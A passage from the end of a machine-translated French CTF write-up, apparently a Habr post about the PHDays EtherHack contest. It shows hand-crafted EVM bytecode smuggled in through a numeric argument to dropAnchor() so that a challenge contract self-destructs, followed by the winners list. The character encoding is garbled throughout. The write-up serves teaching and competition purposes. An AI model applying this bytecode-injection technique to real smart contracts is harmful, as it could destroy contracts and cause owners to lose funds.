suppression inconditionnelle du contrat d'ancrage √† l'aide de <code>selfdestruct()</code> : <br><br><pre>  68 414141ff3f3f3f3f3f ;;  contrat push9
 60 00 ;;  push1 0
 52 ;;  mstore
 60 09 ;;  push1 9
 60 17 ;;  push1 17
 f3 ;;  retour </pre><br>  Si nous convertissons cette s√©quence d'octets en <code>uint256 (9081882833248973872855737642440582850680819)</code> et l'utilisons comme argument de la fonction <code>dropAnchor()</code> , nous obtenons la valeur suivante pour la variable de code (le bytecode en gras est notre charge utile): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x630068414141ff3f3f3f3f3f60005260096017f34310585733ff</span></span></code> </pre> <br>  Une fois que la variable de code fait partie de la variable initcode, nous obtenons la valeur suivante: <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3</span></span></code> </pre> <br>  Maintenant, les octets √©lev√©s <code>0x6300</code> disparu et le reste du bytecode est supprim√© apr√®s <code>0xf3 (return)</code> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/433/f75/735/433f757356003d73286fa4709cdedcfd.png" alt="image"><br><br>  En cons√©quence, un nouveau contrat avec la logique modifi√©e est cr√©√©: <br><br><pre>  41 ;;  coinbase
 41 ;;  coinbase
 41 ;;  coinbase
 ff ;;  auto-destruction
 3f ;;  ordure
 3f ;;  ordure
 3f ;;  ordure
 3f ;;  ordure
 3f ;;  ordure </pre><br>  Si nous appelons maintenant la fonction pullAnchor (), ce contrat sera imm√©diatement d√©truit, car nous n'avons plus de contr√¥le sur block.number.  Apr√®s cela, nous appelons la fonction sailAway () et c√©l√©brons la victoire! <br><br><h2>  R√©sultats </h2><br><ol><li>  Premi√®re place et diffusion d'un montant √©quivalent √† 1 000 dollars am√©ricains: Alexey Pertsev (p4lex) </li><li>  Deuxi√®me place et Ledger Nano S: Alexey Markov </li><li>  Troisi√®me place et souvenirs PHDays: Alexander Vlasov </li></ol><br>  Tous les r√©sultats: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">etherhack.positive.com/#/scoreboard</a> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d88/d86/955/d88d8695572199f7e3d800f34deb18ee.jpg" alt="image"><br><br>  F√©licitations aux gagnants et merci √† tous les participants! <br><br>  PS Merci √† <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Zeppelin d'</a> avoir <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">rendu le</a> code source de la plateforme <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Ethernaut CTF</a> open source. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr414959/">https://habr.com/ru/post/fr414959/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr414945/index.html">L'Universit√© Johns Hopkins a cr√©√© une peau artificielle qui ressent de la douleur</a></li>
<li><a href="../fr414947/index.html">Obtenir Git pour Windows sous ReactOS</a></li>
<li><a href="../fr414951/index.html">Gestion des acc√®s dans Expressjs avec CASL</a></li>
<li><a href="../fr414953/index.html">Nvidia a appris au r√©seau neuronal √† ralentir la vid√©o</a></li>
<li><a href="../fr414955/index.html">Les entreprises ont utilis√© le mot blockchain pour augmenter la capitalisation. Aid√© pendant un certain temps</a></li>
<li><a href="../fr414961/index.html">Pr√©sentation de SERM</a></li>
<li><a href="../fr414963/index.html">Une solution de contournement a √©t√© trouv√©e pour contourner la protection par mot de passe sur iPhone / iPad. Pas vraiment</a></li>
<li><a href="../fr414965/index.html">¬´Protection du droit d'auteur dans l'UE¬ª: la nouvelle r√©forme pourrait non seulement affecter les plateformes m√©diatiques</a></li>
<li><a href="../fr414967/index.html">Comment r√©duire le temps de construction d'un projet √† l'aide du plug-in de performances Firebase</a></li>
<li><a href="../fr414969/index.html">Extension du processus de g√©n√©ration avec MSBuild</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>